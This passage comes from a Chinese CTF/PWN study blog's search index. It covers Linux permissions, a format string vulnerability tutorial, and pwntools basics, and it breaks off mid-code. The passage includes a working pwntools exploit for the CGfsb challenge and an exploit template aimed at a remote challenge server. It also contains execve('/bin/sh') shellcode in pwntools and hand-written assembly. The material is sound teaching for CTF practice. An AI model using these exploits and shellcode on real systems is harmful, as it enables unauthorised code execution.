align="left"><strong>w（Write，写入）</strong></td><td align="left">对文件而言，具有新增、修改、删除文件内容的权限；对目录来说，具有新建、删除、修改、移动目录内文件的权限</td></tr><tr><td align="left"><strong>x（eXecute，执行）</strong></td><td align="left">对文件而言，具有执行文件的权限；对目录而言该用户具有进入目录的权限</td></tr></tbody></table><ol><li><strong>目录的只读访问不允许使用 <code>cd</code> 进入目录</strong>，必须要有执行的权限才能进入</li><li><strong>只有执行权限只能进入目录，不能看到目录下的内容</strong>；要想看到目录下的文件名和目录名，需要可读权限</li><li><strong>一个文件能不能被删除，主要看该文件所在的目录对用户是否具有写权限</strong>，如果目录对用户没有写权限，则该目录下的所有文件都不能被删除，文件所有者除外</li><li>目录的 <strong>w</strong> 位不设置，即使你拥有目录中某文件的 <strong>w</strong> 权限也不能写该文件</li></ol>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2023/03abb5c796.html"/>
      <url>/2023/03abb5c796.html</url>
      
        <content type="html"><![CDATA[<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><blockquote><p>格式化字符串漏洞，是由编程时使用 <code>printf</code> 函数，在将数据格式化输出时产生的漏洞</p></blockquote><blockquote><p>其中 <code>*printf()</code> 函数包括 <code>printf</code>，<code>fprintf</code>，<code>sprintf</code>，<code>snprintf</code>，<code>vprintf</code>，<code>vfprintf</code>，<code>vsprintf</code>，<code>vsnprintf</code> 等函数，它们可以将数据格式化后输出</p></blockquote><blockquote><p>一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞</p></blockquote><hr><ul><li><p><strong>在 pwn 题中遇到格式化字符串漏洞时，一般会分两大步实现漏洞利用：</strong></p><ol><li>第一步构造一个payload，寻找输入字符串到栈顶指针的偏移</li><li>第二步就是攻击了，利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写</li></ol></li><li><p><strong>格式化输出说明符</strong><br>  <img src="https://s2.loli.net/2023/03/17/qwXZ6MnSIjRvDLK.png" alt="CTF - Pwn_格式化字符串漏洞1.png"></p><ol><li><code>%n</code> 是一个不常见的格式化字符串，可以将一个 <code>int</code> 型的值（4字节）写入指定的地址中，这将可以实现栈空间的随意改写</li><li>除了 <code>%n</code>，还有 <code>%hn</code>、<code>%hhn</code>、<code>%lln</code>，分别为写入目标空间 2字节、1字节、8字节，这里的字节对应的是参数的地址开始的几字节</li></ol></li></ul><hr><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><blockquote><p><code>printf()</code> 并不是一般的函数，它是 C 语言中少有的支持可变参数的库函数。所以，在被调用之前，被调用者无法知道函数调用之前有多少个参数被压入栈中。所以，<code>printf</code> 函数要求传入一个 <code>format</code> 参数以指定参数的数量和类型，然后 <code>printf</code> 函数就会严格的按照 <code>format</code> 参数所规定的格式逐个从栈中取出并输出参数</p></blockquote><ol><li>示例一<ul><li><code>printf(&quot;%s %s %s %s %s\n&quot;, str1,str2,str3,str4,str5)</code></li><li><strong>若 <code>printf</code> 函数中低于 6个 参数，则直接将值传给寄存器，按照参数的顺序，从左到右依次为 <code>edi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code></strong></li></ul></li><li>示例二<ul><li><code>printf(&quot;%s %s %s %s %s %s %s %s %s %s %s\n&quot;, str1,str2,str3,str4,str5,str6,str7,str8,str9,str10,str11)</code></li><li><strong>若 <code>printf</code> 函数中多于 6个 参数，从 第七个 参数才开始压栈</strong></li></ul></li></ol><hr><h3 id="关于-的用法"><a href="#关于-的用法" class="headerlink" title="关于 $ 的用法"></a>关于 $ 的用法</h3><blockquote><p><code>$</code> 号是用来指定参数的</p></blockquote><ul><li>示例一，**<code>$n</code> 演示：**<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"hello "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"world "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"I "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"am "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Tom "</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2$s %s %s %s %s %s\n"</span><span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span>str3<span class="token punctuation">,</span>str4<span class="token punctuation">,</span>str5 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li>输出：<br>  world hello world I am Tom</li></ul><blockquote><p>通过 <code>%n$p</code>，合理控制 <code>n</code> 就能获取栈中数据</p></blockquote><hr><h3 id="关于-n-的用法"><a href="#关于-n-的用法" class="headerlink" title="关于 %n 的用法"></a>关于 %n 的用法</h3><blockquote><p>向指定的地址中写入已经输出的字节个数</p></blockquote><ul><li><strong><code>%n</code> 演示：</strong><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"111111"</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"222222"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%%48c%2$hhn \n"</span><span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c %c %c %c\n"</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li>输出：<br>  %48c<br>  4 32 32 32</li></ul><hr><table><thead><tr><th align="left">目的</th><th align="left">实现</th></tr></thead><tbody><tr><td align="left">读取栈上某地址的大概格式</td><td align="left"><code>%%参数顺序$类型n</code>，譬如：<code>%7$lx</code>，就是以 <code>lx</code> 格式读 第7个 参数的值</td></tr><tr><td align="left">做写入的一般格式</td><td align="left"><code>%%数值c%参数顺序$类型</code>，譬如说：<code>%%40c%5$hhn</code>，就是向 第5个 参数写入 40 这个数值</td></tr></tbody></table><hr><ul><li><strong>如果给出的 <code>format</code> 参数的个数 &gt; 待输出的参数数量</strong><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %d %d %d %d %x %x"</span><span class="token punctuation">,</span><span class="token string">"num"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li>输出：<br>  1 2 3 33 test 1a1390 4013e8</li></ul><blockquote><p>虽然给了 7个 格式化输出的参数，但是实际压入栈中的参数只有 5个，所以，<code>printf</code> 会输出两个本不应该输出的地址内容，借助这个漏洞，我们就泄露出了栈中的数据</p></blockquote><hr><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><h3 id="泄露任意地址内容"><a href="#泄露任意地址内容" class="headerlink" title="泄露任意地址内容"></a>泄露任意地址内容</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leave your message please:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"your message is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> pwnme <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you pwned me, here is your flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thank you!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>看到第7行，<code>printf</code> 输出了在前面输入的 <code>v8</code> 变量，但是并没有给出任何格式化参数，所以我们可以通过构造 <code>v8</code> 的值来让 <code>printf</code> 误以为程序给出了格式化参数，从而按照我们的意思输出我们所需的值</p></blockquote><ul><li>输出：<br>  <em>please tell me your name:</em><br>  <code>aaaa</code><br>  <em>leave your message please:</em><br>  <code>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</code><br>  <em>hello aaaa</em><br>  <em>your message is:</em><br>  <code>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025</code><br>  <em>Thank you!</em></li></ul><blockquote><p>显然，程序泄露出了我们想要知道的 <code>printf</code> 函数的栈帧中输出字符串后 19个 内存单元的值，理论上来说，我们可以使用这个漏洞来进行任意读取栈中的值</p></blockquote><hr><h3 id="修改任意地址值"><a href="#修改任意地址值" class="headerlink" title="修改任意地址值"></a>修改任意地址值</h3><blockquote><p>任意地址写就要用到 <code>%n</code> 了</p></blockquote><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the usage of %n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c = %d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ul><li>输出：<br>  c &#x3D; 13</li></ul><blockquote><p>就是说，**<code>%n</code> 参数把他前面输出的字符数赋值给了变量 <code>c</code>**，因此，只要更改 <code>c</code> 所对应栈中的地址就可以把想要的数值赋给对应地址</p></blockquote><hr><h3 id="printf-的栈结构"><a href="#printf-的栈结构" class="headerlink" title="printf 的栈结构"></a>printf 的栈结构</h3><h2 id="把先前输出字符的总长度赋值给了参数-4-所对应的地址，也就是说，只要控制前面输出的长度就可以控制该参数所对应地址的值了-要想控制-参数4-的值，就要用到-printf-的另外一个特性：-操作符。这个操作符可以输出指定位置的参数-假如格式化输出参数是-6-n-的话，就把之前输出的长度赋值给-printf-函数的-第6个-参数，但是-printf-函数根本不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间-1-例如，把这个偏移数值定位到题目中的-v8-变量所在地址-2-获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：-AAAA-0xffffd13e-0xf7fae580-0xffffd19c-0xf7ffdae0-0x1-0xf7fcb410-0x61610001-0xa6161-nil-0x41414141-0x25207025-0x70252070-0x20702520-0x20207025-0x20207025-0x20207025-0x20207025-0x20207025-0x20207025-3-看到-39-0x41414141-39-，就是输入的-AAAA，也就是说，可以控制的内存空间相对位置在-printf-函数的-第10个-参数位置-其实-printf-函数根本没有这么多个参数，只不过他自己并不知道；从-AAAA-到-0x41414141-还有-九个-输出值，所以-v8-在相对-第10个-参数位置"><a href="#把先前输出字符的总长度赋值给了参数-4-所对应的地址，也就是说，只要控制前面输出的长度就可以控制该参数所对应地址的值了-要想控制-参数4-的值，就要用到-printf-的另外一个特性：-操作符。这个操作符可以输出指定位置的参数-假如格式化输出参数是-6-n-的话，就把之前输出的长度赋值给-printf-函数的-第6个-参数，但是-printf-函数根本不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间-1-例如，把这个偏移数值定位到题目中的-v8-变量所在地址-2-获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：-AAAA-0xffffd13e-0xf7fae580-0xffffd19c-0xf7ffdae0-0x1-0xf7fcb410-0x61610001-0xa6161-nil-0x41414141-0x25207025-0x70252070-0x20702520-0x20207025-0x20207025-0x20207025-0x20207025-0x20207025-0x20207025-3-看到-39-0x41414141-39-，就是输入的-AAAA，也就是说，可以控制的内存空间相对位置在-printf-函数的-第10个-参数位置-其实-printf-函数根本没有这么多个参数，只不过他自己并不知道；从-AAAA-到-0x41414141-还有-九个-输出值，所以-v8-在相对-第10个-参数位置" class="headerlink" title="- 把先前输出字符的总长度赋值给了参数 4 所对应的地址，也就是说，只要控制前面输出的长度就可以控制该参数所对应地址的值了- 要想控制 参数4 的值，就要用到 printf 的另外一个特性：$ 操作符。这个操作符可以输出指定位置的参数- 假如格式化输出参数是 %6$n 的话，就把之前输出的长度赋值给 printf 函数的 第6个 参数，但是 printf 函数根本不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间    1. 例如，把这个偏移数值定位到题目中的 v8 变量所在地址    2. 获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：        AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025    3. 看到 &#39;0x41414141&#39;，就是输入的 AAAA，也就是说，可以控制的内存空间相对位置在 printf 函数的 第10个 参数位置        - 其实 printf 函数根本没有这么多个参数，只不过他自己并不知道；从 AAAA 到 0x41414141 还有 九个 输出值，所以 v8 在相对 第10个 参数位置"></a><img src="https://s2.loli.net/2023/03/17/Gb6ugVmROpPU1or.png" alt="CTF - Pwn_格式化字符串漏洞2.png"><br>- 把先前输出字符的总长度赋值给了参数 4 所对应的地址，也就是说，只要控制前面输出的长度就可以控制该参数所对应地址的值了<br>- 要想控制 参数4 的值，就要用到 <code>printf</code> 的另外一个特性：<code>$</code> 操作符。这个操作符可以输出指定位置的参数<br>- 假如格式化输出参数是 <code>%6$n</code> 的话，就把之前输出的长度赋值给 <code>printf</code> 函数的 第6个 参数，但是 <code>printf</code> 函数根本不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间<br>    1. 例如，把这个偏移数值定位到题目中的 v8 变量所在地址<br>    2. 获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：<br>        <code>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025</code><br>    3. 看到 <code>&#39;0x41414141&#39;</code>，就是输入的 <code>AAAA</code>，也就是说，可以控制的内存空间相对位置在 <code>printf</code> 函数的 第10个 参数位置<br>        - 其实 <code>printf</code> 函数根本没有这么多个参数，只不过他自己并不知道；从 <code>AAAA</code> 到 <code>0x41414141</code> 还有 九个 输出值，所以 <code>v8</code> 在相对 第10个 参数位置</h2><h3 id="构造-exp-的实例"><a href="#构造-exp-的实例" class="headerlink" title="构造 exp 的实例"></a>构造 exp 的实例</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./CGfsb"</span><span class="token punctuation">)</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x0804A068</span> <span class="token comment">#pwnme地址在伪代码中双击查看</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'aaaa'</span> <span class="token operator">+</span> <span class="token string">'%10\$n'</span> <span class="token comment">#pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwntools</title>
      <link href="/2023/037ed854a.html"/>
      <url>/2023/037ed854a.html</url>
      
        <content type="html"><![CDATA[<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><table><thead><tr><th align="left">名称</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left"><strong>exploit（简称exp）</strong></td><td align="left">用于攻击的脚本与方案</td></tr><tr><td align="left"><strong>payload</strong></td><td align="left">攻击载荷，是对目标进程劫持控制流的数据</td></tr><tr><td align="left"><strong>shellcode</strong></td><td align="left">调用攻击目标的 shell 的代码</td></tr></tbody></table><hr><h2 id="exp-py-程序输入脚本样例"><a href="#exp-py-程序输入脚本样例" class="headerlink" title="exp.py 程序输入脚本样例"></a>exp.py 程序输入脚本样例</h2><blockquote><p>注意养成好的书写习惯</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./when"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span> <span class="token number">37645</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>  <span class="token comment"># 需要上传的输入内容，(0x20 - 0x18 + 8)根据栈地址确定需要输入的数据位数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>  <span class="token comment"># 给程序发送输入内容</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 给程序发送payload作为输入内容</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p><strong>如果 <code>exp.py</code> 可以 PWN 通，在远程只会显示 <code>[*] Switching to interactive mode</code>，而不会显示 <code>[*] Got EOF while reading in interactive</code> ，否则说明 PWN 失败了</strong></p></blockquote><hr><h2 id="exp-获取信息"><a href="#exp-获取信息" class="headerlink" title="exp 获取信息"></a>exp 获取信息</h2><ul><li><p>获取 elf 文件中某个已知函数名的函数地址</p><pre class="language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序路径</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>   <span class="token comment"># system_addr为程序test中函数"callsystem"的地址</span></code></pre></li><li><p>获取程序在某一行的输出信息，并将其转换为 16进制 数据</p><pre class="language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'But there is gift for you :\n'</span><span class="token punctuation">)</span>   <span class="token comment"># 屏幕输出信息</span>main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>caiji<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 接收直到 \n 为止的输出数据，并将其转换为16进制 int 型，最后赋值main_addr</span></code></pre></li></ul><blockquote><p>注意，<strong>函数的地址也可以在 IDA 中直接看到</strong>，但是<mark>如果程序开启了 PIE（地址随机化），即：每次输出到屏幕的信息不一样，则不能采取直接查看 IDA 中的地址并进行赋值，只能使用从屏幕获取程序输出数据的方法</mark></p></blockquote><hr><h2 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h2><blockquote><p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些能够获取到 shell 的 code 就是 shellcode</p><p>在漏洞利用过程时，我们将编制好的 shellcode 通过有问题的程序写入到内存中，然后执行它</p><p>shellcode 对应的 C 语言代码一般为：<code>system(&quot;/bin/sh&quot;)</code></p></blockquote><hr><h3 id="Pwntools-生成默认-shellcode"><a href="#Pwntools-生成默认-shellcode" class="headerlink" title="Pwntools 生成默认 shellcode"></a>Pwntools 生成默认 shellcode</h3><ol><li>方法一：<pre class="language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span></code></pre></li><li>方法二：<pre class="language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造64位shellcode</span></code></pre></li></ol><blockquote><p><strong>这段代码有一个缺点，就是生成的 shellcode 比较长，在某些可写入空间比较小的情况下不能很好的使用</strong><br><strong>通常生成的 64 位 shellcode 长度为 0x30，32 位 shellcode 长度为 0x2c</strong></p></blockquote><hr><h3 id="手动编写的-shellcode"><a href="#手动编写的-shellcode" class="headerlink" title="手动编写的 shellcode"></a>手动编写的 shellcode</h3><h4 id="shellcode-代码调动-shell-的原理"><a href="#shellcode-代码调动-shell-的原理" class="headerlink" title="shellcode 代码调动 shell 的原理"></a>shellcode 代码调动 shell 的原理</h4><ol><li>在 linux 中，存在一系列的系统调用，这些系统调用都通过 <code>syscall</code> 指令来触发，并且通过 <code>rax</code> 寄存器作为系统调用号来区分不同的系统调用，可以查看 linux 下的 <code>arch/x86/entry/syscall_64.tbl</code> 获得对应的系统调用号。比如，<code>execve</code>（执行程序函数，类似于 Python 中的<code>os.system</code> 函数，可以调用其他程序的执行）对应的的系统调用号为 59</li><li>接着，通过 <code>rdi</code> 和 <code>rsi</code> 两个寄存器传入参数。其中，<code>rdi</code> 是指向运行程序的路径的指针，<code>rsi</code> 为一个指向 0 的指针，<code>rdx</code> 为 0</li><li>也就是说，整个过程应该完成：<pre class="language-c" data-language="c"><code class="language-c">rax <span class="token operator">=</span> <span class="token number">59</span>rdi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token char">'/bin/sh'</span><span class="token punctuation">]</span>rsi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>rdx <span class="token operator">=</span> <span class="token number">0</span>syscall</code></pre></li><li>对应的汇编代码：<pre class="language-c" data-language="c"><code class="language-c">xor rdx<span class="token punctuation">,</span>rdxpush rdxmov rsi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">0x68732f2f6e69622f</span>  <span class="token comment">// 这里因为64位数据不能直接push，所以用了rax寄存器来传递</span>push raxmov rdi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">59</span>syscall</code></pre></li></ol><h4 id="利用-Pwntools-编译使用"><a href="#利用-Pwntools-编译使用" class="headerlink" title="利用 Pwntools 编译使用"></a>利用 Pwntools 编译使用</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdx,rdx;push rdx;mov rsi,rsp;mov rax,0x68732f2f6e69622f;push rax;mov rdi,rsp;mov rax,59;syscall;'''</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment"># 